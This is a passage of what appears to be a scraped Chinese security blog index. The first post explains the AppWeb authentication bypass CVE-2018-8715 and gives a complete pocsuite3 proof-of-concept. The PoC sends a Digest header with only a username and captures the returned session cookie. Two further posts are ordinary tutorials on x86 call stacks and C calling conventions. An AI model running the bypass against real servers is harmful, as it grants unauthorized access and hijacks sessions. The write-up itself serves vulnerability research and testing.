httpLogin(HttpConn *conn, cchar *username, cchar *password){ HttpRx *rx; HttpAuth *auth; HttpSession *session; HttpVerifyUser verifyUser; rx = conn-&gt;rx; auth = rx-&gt;route-&gt;auth; if (!username || !*username) { httpTrace(conn, &quot;auth.login.error&quot;, &quot;error&quot;, &quot;msg:'missing username'&quot;); return 0; } if (!auth-&gt;store) { mprLog(&quot;error http auth&quot;, 0, &quot;No AuthStore defined&quot;); return 0; } if ((verifyUser = auth-&gt;verifyUser) == 0) { if (!auth-&gt;parent || (verifyUser = auth-&gt;parent-&gt;verifyUser) == 0) { verifyUser = auth-&gt;store-&gt;verifyUser; } } if (!verifyUser) { mprLog(&quot;error http auth&quot;, 0, &quot;No user verification routine defined on route %s&quot;, rx-&gt;route-&gt;pattern); return 0; } if (auth-&gt;username &amp;&amp; *auth-&gt;username) { /* If using auto-login, replace the username */ username = auth-&gt;username; password = 0; } if (!(verifyUser)(conn, username, password)) { return 0; } if (!(auth-&gt;flags &amp; HTTP_AUTH_NO_SESSION) &amp;&amp; !auth-&gt;store-&gt;noSession) { if ((session = httpCreateSession(conn)) == 0) { /* Too many sessions */ return 0; } httpSetSessionVar(conn, HTTP_SESSION_USERNAME, username); httpSetSessionVar(conn, HTTP_SESSION_IP, conn-&gt;ip); } rx-&gt;authenticated = 1; rx-&gt;authenticateProbed = 1; conn-&gt;username = sclone(username); conn-&gt;encoded = 0; return 1;} 这一函数会检查username是否为空，当存在session时，password指针可以为空，所以设置空密码指针，即使返回错误，也不会被authCondition检查，允许我们绕过身份验证 用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。 POC编写12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from collections import OrderedDictfrom pocsuite3.api import Output, POCBase, OptString, register_poc, requestsclass AppWebPoc(POCBase): vulID = '003' version = '1.0' author = ['ol4three'] vulDate = '2020-12-22' updateDate = '2020-12-22' references = ['https://ssd-disclosure.com/ssd-advisory-appweb-authentication-bypass-digest-and-forms/'] name = 'AppWeb CVE-2018-8715' appPowerLink = 'https://www.embedthis.com/' appName = 'AppWeb' appVersion = '&lt;7.0.3' vulType = 'Login Bypass' desc = ''' session ''' pocDesc = ''' pocsuite -r ***.py -u target --verify&quot; ''' samples = [] install_requires = [] def _options(self): o = OrderedDict() o[&quot;username&quot;] = OptString('', description='这个poc需要用户登录，请输入登录账号', require=True) return o def _verify(self): result = {} payload = self.get_option(&quot;username&quot;) #payload = &quot;username={0}&quot;.format(self.get_option(&quot;username&quot;)) url = self.url headers={ 'Authorization': 'Digest username=&quot;' +str(payload) +'&quot;' } # proxies={ # 'http':'127.0.0.1:8080', # 'https':'127.0.0.1:8080' # } r = requests.get(url, headers=headers) if r.status_code == 200: result['VerifyInfo'] = {} result['VerifyInfo']['URL'] = url result['VerifyInfo']['set-cookie'] = r.headers['set-cookie'] return self.parse_output(result) def parse_output(self, result): output = Output(self) if result: output.success(result) else: output.fail('target is not vulnerable') return output def _attack(self): return self._verify()register_poc(AppWebPoc)","link":"/2020/12/22/WEB/Exploit/AppWeb/AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2018-8715/"},{"title":"C语言函数调用栈(一)","text":"程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到调用指令的下一条指令(紧接call指令)处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)以备恢复以及存储本地局部变量。 不同处理器和编译器的堆栈布局、函数调用方法都可能不同，但堆栈的基本概念是一样的。 1 寄存器分配寄存器是处理器加工数据或运行程序的重要载体，用于存放程序执行中用到的数据和指令。因此函数调用栈的实现与处理器寄存器组密切相关。 Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示： 图1 IA32处理器寄存器 最初的8086中寄存器是16位，每个都有特殊用途，寄存器名城反映其不同用途。由于IA32平台采用平面寻址模式，对特殊寄存器的需求大大降低，但由于历史原因，这些寄存器名称被保留下来。在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。某些指令可能以固定的寄存器作为源寄存器或目的寄存器，如一些特殊的算术操作指令imull/mull/cltd/idivl/divl要求一个参数必须在%eax中，其运算结果存放在%edx(higher 32-bit)和%eax (lower32-bit)中；又如函数返回值通常保存在%eax中，等等。为避免兼容性问题，ABI规范对这组通用寄存器的具体作用加以定义(如图中所示)。 对于寄存器%eax、%ebx、%ecx和%edx，各自可作为两个独立的16位寄存器使用，而低16位寄存器还可继续分为两个独立的8位寄存器使用。编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用，例如mov $5, %eax或mov eax, 5表示将立即数5赋值给寄存器%eax。 在x86处理器中，EIP(Instruction Pointer)是指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加。ESP(Stack Pointer)是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；EBP(Base Pointer)是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。 注意，EIP是个特殊寄存器，不能像访问通用寄存器那样访问它，即找不到可用来寻址EIP并对其进行读写的操作码(OpCode)。EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。 不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器的大小。例如x86架构用字母“e(extended)”作名称前缀，指示寄存器大小为32位；x86_64架构用字母“r”作名称前缀，指示各寄存器大小为64位。 编译器在将C程序编译成汇编程序时，应遵循ABI所规定的寄存器功能定义。同样地，编写汇编程序时也应遵循，否则所编写的汇编程序可能无法与C程序协同工作。 `【扩展阅读】栈帧指针寄存器 为了访问函数局部变量，必须能定位每个变量。局部变量相对于堆栈指针ESP的位置在进入函数时就已确定，理论上变量可用ESP加偏移量来引用，但ESP会在函数执行期随变量的压栈和出栈而变动。尽管某些情况下编译器能跟踪栈中的变量操作以修正偏移量，但要引入可观的管理开销。而且在有些机器上(如Intel处理器)，用ESP加偏移量来访问一个变量需要多条指令才能实现。 因此，许多编译器使用帧指针寄存器FP(Frame Pointer)记录栈帧基地址。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作局部基指针(LB-local base pointer)。 在Intel CPU中，寄存器BP(EBP)用作帧指针。在Motorola CPU中，除A7(堆栈指针SP)外的任何地址寄存器都可用作FP。当堆栈向下(低地址)增长时，以FP地址为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值。` 2 寄存器使用约定 程序寄存器组是唯一能被所有函数共享的资源。虽然某一时刻只有一个函数在执行，但需保证当某个函数调用其他函数时，被调函数不会修改或覆盖主调函数稍后会使用到的寄存器值。因此，IA32采用一套统一的寄存器使用约定，所有函数(包括库函数)调用都必须遵守该约定。 根据惯例，寄存器%eax、%edx和%ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器%ebx、%esi和%edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器%ebp和%esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。 当然，这些工作都由编译器在幕后进行。不过在编写汇编程序时应注意遵守上述惯例。 3 栈帧结构函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。 编译器利用栈帧，使得函数参数和函数中局部变量的分配与释放对程序员透明。编译器将控制权移交函数本身之前，插入特定代码将函数参数压入栈帧中，并分配足够的内存空间用于存放函数中的局部变量。使用栈帧的一个好处是使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。 栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。 为更具描述性，以下称EBP为帧基指针， ESP为栈顶指针，并在引用汇编代码时分别记为%ebp和%esp。 函数调用栈的典型内存布局如下图所示： 图中给出主调函数(caller)和被调函数(callee)的栈帧布局，”m(%ebp)”表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)。该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于”12(%ebp)” 处；第二，每个参数都是4字节大小(栈的粒度为4字节)。在本文后续章节将就参数的传递和大小问题做进一步的探讨。 此外，函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分。 从图中可以看出，函数调用时入栈顺序为 实参N1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1N 其中，主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。 EBP指针在当前函数运行过程中(未调用其他函数时)保持不变。在函数调用前，ESP指针指向栈顶地址，也是栈底地址。在函数完成现场保护之类的初始化工作后，ESP会始终指向当前函数栈帧的栈顶，此时，若当前函数又调用另一个函数，则会将此时的EBP视为旧EBP压栈，而与新调用函数有关的内容会从当前ESP所指向位置开始压栈。 若需在函数中保存被调函数保存寄存器(如ESI、EDI)，则编译器在保存EBP值时进行保存，或延迟保存直到局部变量空间被分配。在栈帧中并未为被调函数保存寄存器的空间指定标准的存储位置。包含寄存器和临时变量的函数调用栈布局可能如下图所示： 在多线程(任务)环境，栈顶指针指向的存储器区域就是当前使用的堆栈。切换线程的一个重要工作，就是将栈顶指针设为当前线程的堆栈栈顶地址。 以下代码用于函数栈布局示例： \u0004\u0004 1 //StackFrame.c 2 #include &lt;stdio.h&gt; 3 #include &lt;string.h&gt; 4 5 struct Strt{ 6 int member1; 7 int member2; 8 int member3; 9 };10 11 #define PRINT_ADDR(x) printf(&quot;&amp;&quot;#x&quot; = %p\\n&quot;, &amp;x)12 int StackFrameContent(int para1, int para2, int para3){13 int locVar1 = 1;14 int locVar2 = 2;15 int locVar3 = 3;16 int arr[] = {0x11,0x22,0x33};17 struct Strt tStrt = {0};18 PRINT_ADDR(para1); //若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！19 PRINT_ADDR(para2);20 PRINT_ADDR(para3);21 PRINT_ADDR(locVar1);22 PRINT_ADDR(locVar2);23 PRINT_ADDR(locVar3);24 PRINT_ADDR(arr);25 PRINT_ADDR(arr[0]);26 PRINT_ADDR(arr[1]);27 PRINT_ADDR(arr[2]);28 PRINT_ADDR(tStrt);29 PRINT_ADDR(tStrt.member1);30 PRINT_ADDR(tStrt.member2);31 PRINT_ADDR(tStrt.member3);32 return 0;33 }34 35 int main(void){36 int locMain1 = 1, locMain2 = 2, locMain3 = 3;37 PRINT_ADDR(locMain1);38 PRINT_ADDR(locMain2);39 PRINT_ADDR(locMain3);40 StackFrameContent(locMain1, locMain2, locMain3);41 printf(&quot;[locMain1,2,3] = [%d, %d, %d]\\n&quot;, locMain1, locMain2, locMain3);42 memset(&amp;locMain2, 0, 2*sizeof(int));43 printf(&quot;[locMain1,2,3] = [%d, %d, %d]\\n&quot;, locMain1, locMain2, locMain3);44 return 0;45 } \u0004编译链接并执行后，输出打印如下： 函数栈布局示例如下图所示。为直观起见，低于起始高地址0xbfc75a58的其他地址采用点记法，如0x.54表示0xbfc75a54，以此类推。 内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址=tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，结构体成员变量的入栈顺序与其在结构体中声明的顺序相反。 函数调用以值传递时，传入的实参(locMain13)与被调函数内操作的形参(para13)两者存储地址不同，因此被调函数无法直接修改主调函数实参值(对形参的操作相当于修改实参的副本)。为达到修改目的，需要向被调函数传递实参变量的指针(即变量的地址)。 此外，”[locMain1,2,3] = [0, 0, 3]”是因为对四字节参数locMain2调用memset函数时，会从低地址向高地址连续清零8个字节，从而误将位于高地址locMain1清零。 注意，局部变量的布局依赖于编译器实现等因素。因此，当StackFrameContent函数中删除打印语句时，变量locVar3、locVar2和locVar1可能按照从高到低的顺序依次存储！而且，局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中。数组/结构体型的局部变量通常分配在栈内存中。 【扩展阅读】函数局部变量布局方式 与函数调用约定规定参数如何传入不同，局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。 基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义。 4 堆栈操作 函数调用时的具体步骤如下： 1) 主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。 注：x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。 2) 主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。 3) 若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。 4) 被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。 5) 被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。 6) 一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。 7) 恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。 8) 被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。 9) 主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。 步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。 以下介绍函数调用过程中的主要指令。 压栈**(push)**：栈顶指针ESP减小4个字节；以字节为单位将寄存器数据(四字节，不足补零)压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。 出栈**(pop)**：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节。 可见，压栈操作将寄存器内容存入栈内存中(寄存器原内容不变)，栈顶地址减小；出栈操作从栈内存中取回寄存器内容(栈内已存数据不会自动清零)，栈顶地址增大。栈顶指针ESP总是指向栈中下一个可用数据。 调用**(call)**：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈，以备返回时能恢复执行下条指令；然后设置EIP指向被调函数代码开始处，以跳转到被调函数的入口地址执行。 离开**(leave)**： 恢复主调函数的栈帧以准备返回。等价于指令序列movl %ebp, %esp(恢复原ESP值，指向被调函数栈帧开始处)和popl %ebp(恢复原ebp的值，即主调函数帧基指针)。 返回**(ret)**：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。 基于以上指令，使用C调用约定的被调函数典型的函数序和函数跋实现如下： 指令序列 含义 函数序(prologue) push %ebp 将主调函数的帧基指针%ebp压栈，即保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧 mov %esp, %ebp 将主调函数的栈顶指针%esp赋给被调函数帧基指针%ebp。此时，%ebp指向被调函数新栈帧的起始地址(栈底)，亦即旧%ebp入栈后的栈顶 sub , %esp 将栈顶指针%esp减去指定字节数(栈顶下移)，即为被调函数局部变量开辟栈空间。为立即数且通常为16的整数倍(可能大于局部变量字节总数而稍显浪费，但gcc采用该规则保证数据的严格对齐以有效运用各种优化编译技术) push 可选。如有必要，被调函数负责保存某些寄存器(%edi/%esi/%ebx)值 函数跋(epilogue) pop 可选。如有必要，被调函数负责恢复某些寄存器(%edi/%esi/%ebx)值 mov %ebp, %esp* 恢复主调函数的栈顶指针%esp，将其指向被调函数栈底。此时，局部变量占用的栈空间被释放，但变量内容未被清除(跳过该处理) pop %ebp* 主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处 ret 从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈 *：这两条指令序列也可由leave指令实现，具体用哪种方式由编译器决定。 若主调函数和调函数均未使用局部变量寄存器EDI、ESI和EBX，则编译器无须在函数序中对其压栈，以便提高程序的执行效率。 参数压栈指令因编译器而异，如下两种压栈方式基本等效： extern CdeclDemo(int w, int x, int y, intz); //调用CdeclDemo函数 CdeclDemo(1, 2, 3, 4); //调用CdeclDemo函数 压栈方式一 压栈方式二 pushl 4 //压入参数zpushl 3 //压入参数ypushl 2 //压入参数xpushl 1 //压入参数wcall CdeclDemo //调用函数addl $16, %esp //恢复ESP原值，使其指向调用前保存的返回地址 subl $16, %esp //多次调用仅执行一遍movl $4, 12(%esp) //传送参数z至堆栈第四个位置movl $3, 8(%esp) //传送参数y至堆栈第三个位置movl $2, 4(%esp) //传送参数x至堆栈第二个位置movl $1, (%esp) //传送参数w至堆栈栈顶call CdeclDemo //调用函数 两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。gcc3.4(或更高版本)编译器采用该技术将函数参数传递至栈上，相比栈顶指针随每次参数压栈而多次下移，一次性设置好栈顶指针更为高效。设想连续调用多个函数时，方式二仅需预先分配一次参数内存(大小足够容纳参数尺寸和最大的函数即可)，后续调用无需每次都恢复栈顶指针。注意，函数被调用时，两种方式均使栈顶指针指向函数最左边的参数。本文不再区分两种压栈方式，”压栈”或”入栈”所提之处均按相应汇编代码理解，若无汇编则指方式二。 某些情况下，编译器生成的函数调用进入/退出指令序列并不按照以上方式进行。例如，若C函数声明为static(只在本编译单元内可见)且函数在编译单元内被直接调用，未被显示或隐式取地址(即没有任何函数指针指向该函数)，此时编译器确信该函数不会被其它编译单元调用，因此可随意修改其进/出指令序列以达到优化目的。 尽管使用的寄存器名字和指令在不同处理器架构上有所不同，但创建栈帧的基本过程一致。 注意，栈帧是运行时概念，若程序不运行，就不存在栈和栈帧。但通过分析目标文件中建立函数栈帧的汇编代码(尤其是函数序和函数跋过程)，即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用。 参考链接：https://www.cnblogs.com/clover-toeic/p/3755401.html","link":"/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88-%E4%B8%80/"},{"title":"C语言函数调用栈(二)","text":"5 函数调用约定 创建一个栈帧的最重要步骤是主调函数如何向栈中传递函数参数。主调函数必须精确存储这些参数，以便被调函数能够访问到它们。函数通过选择特定的调用约定，来表明其希望以特定方式接收参数。此外，当被调函数完成任务后，调用约定规定先前入栈的参数由主调函数还是被调函数负责清除，以保证程序的栈顶指针完整性。 函数调用约定通常规定如下几方面内容： 1) 函数参数的传递顺序和方式 最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能。 2) 栈的维护方式 主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由主调函数负责完成，也可由被调函数负责完成。 3) 名字修饰(Name-mangling)策略 又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。 若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。 5.1 常见调用约定 下面分别介绍常见的几种函数调用约定。 1. cdecl**调用约定** 又称C调用约定，是C/C++编译器默认的函数调用约定。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式。函数参数按照从右到左的顺序入栈，函数调用者负责清除栈中的参数，返回值在EAX中。由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)。但cdecl调用方式支持可变参数函数(即函数带有可变数目的参数，如printf)，且调用时即使实参和形参数目不符也不会导致堆栈错误。对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。 【扩展阅读】可变参数函数支持条件 若要支持可变参数的函数，则参数应自右向左进栈，并且由主调函数负责清除栈中的参数(参数出栈)。 首先，参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如printf函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错！ 其次，调用函数将参数压栈，只有它才知道栈中的参数数目和尺寸，因此调用函数可安全地清栈。而被调函数永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整。 C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态。 2. stdcall**调用约定(微软命名**) Pascal程序缺省调用方式，WinAPI也多采用该调用约定。stdcall调用约定主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由被调函数负责清除栈中的参数，返回值在EAX中。stdcall调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，如_functionname@number。 3. fastcall**调用约定** stdcall调用约定的变形，通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈，被调函数在返回前负责清除栈中的参数，返回值在 EAX 中。因为并不是所有的参数都有压栈操作，所以比stdcall和cdecl快些。编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意fastcall函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突。 4. thiscall**调用约定** C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。 thiscall调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。thiscall不是C++关键字，故不能使用thiscall声明函数，它只能由编译器使用。 注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%ecx寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。 5. naked call**调用约定** 对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call。该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数： 代码示例如下(Windows采用Intel汇编语法，注释符为;)： __declspec(naked) int __stdcall function(int a, int b) { ;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T) __asm mov eax, a __asm add eax, b __asm ret 8} 6. pascal**调用约定** Pascal语言调用约定，参数按照从左至右的顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。 Win3.X(16位)时支持真正的pascal调用约定；而Win9.X(32位)以后pascal约定由stdcall约定代替(以C约定压栈以Pascal约定清栈)。 上述调用约定的主要特点如下表所示： 调用方式 stdcall(Win32) cdecl fastcall thiscall(C++) naked call 参数压栈顺序 从右至左 从右至左 从右至左，Arg1在ecx，Arg2在edx 从右至左，this指针在ecx 自定义 参数位置 栈 栈 栈 + 寄存器 栈，寄存器ecx 自定义 负责清栈的函数 被调函数 主调函数 被调函数 被调函数 自定义 支持可变参数 否 是 否 否 自定义 函数名字格式 _name@number _name @name@number 自定义 参数表开始标识 “@@YG” “@@YA” “@@YI” 自定义 注：C++因支撑函数重载、命名空间和成员函数等语法特征，采用更为复杂的名字修饰策略。 C++函数修饰名以”?”开始，后面紧跟函数名、参数表开始标识和按照类型代号拼出的返回值参数表。 例如，函数int Function(char *var1,unsigned long)对应的stdcall修饰名为”?Function@@YGHPADK@Z”。 Windows下可直接在函数声明前添加关键字stdcall、cdecl或fastcall等标识确定函数的调用方式，如int __stdcall func()。Linux下可借用函数attribute 机制，如int __attribute((stdcall)) func()。 代码示例如下： int __attribute__((__cdecl__)) CalleeFunc(int i, int j, int k){// int __attribute__((__stdcall__)) CalleeFunc(int i, int j, int k){//int __attribute__((__fastcall__)) CalleeFunc(int i, int j, int k){ return i+j+k;}void CallerFunc(void){ CalleeFunc(0x11, 0x22, 0x33);}int main(void){ CallerFunc(); return 0;} 被调函数CalleeFunc分别声明为cdecl、stdcall和fastcall约定时，其汇编代码比较如下表所示： 5.2 调用约定影响 当函数导出被其他程序员所使用(如库函数)时，该函数应遵循主要的调用约定，以便于程序员使用。若函数仅供内部使用，则其调用约定可只被使用该函数的程序所了解。 在多语言混合编程(包括A语言中使用B语言开发的第三方库)时，若函数的原型声明和函数体定义不一致或调用函数时声明了不同的函数约定，将可能导致严重问题(如堆栈被破坏)。 以Delphi调用C函数为例。Delphi函数缺省采用stdcall调用约定，而C函数缺省采用cdecl调用约定。一般将C函数声明为stdcall约定，如：int __stdcall add(int a, int b); 在Delphi中调用该函数时也应声明为stdcall约定： function add(a: Integer; b: Integer): Integer; stdcall; //参数类型应与DLL中的函数或过程参数类型一致，且引用时使用stdcall参数external 'a.dll'; //指定被调DLL文件的路径和名称 不同编译器产生栈帧的方式不尽相同，主调函数不一定能正常完成清栈工作；而被调函数必然能自己完成正常清栈，因此，在跨(开发)平台调用中，通常使用stdcall调用约定(不少WinApi均采用该约定)。 此外，主调函数和被调函数所在模块采用相同的调用约定，但分别使用C++和C语法编译时，会出现链接错误(报告被调函数未定义)。这是因为两种语言的函数名字修饰规则不同，解决方式是使用extern “C”告知主调函数所在模块：被调函数是C语言编译的。采用C语言编译的库应考虑到使用该库的程序可能是C++程序(使用C++编译器)，通常应这样声明头文件： #ifdef _cplusplus extern &quot;C&quot; {#endif type Func(type para);#ifdef _cplusplus }#endif 这样C++编译器就会按照C语言修饰策略链接Func函数名，而不会出现找不到函数的链接错误。 5.3 x86函数参数传递方法 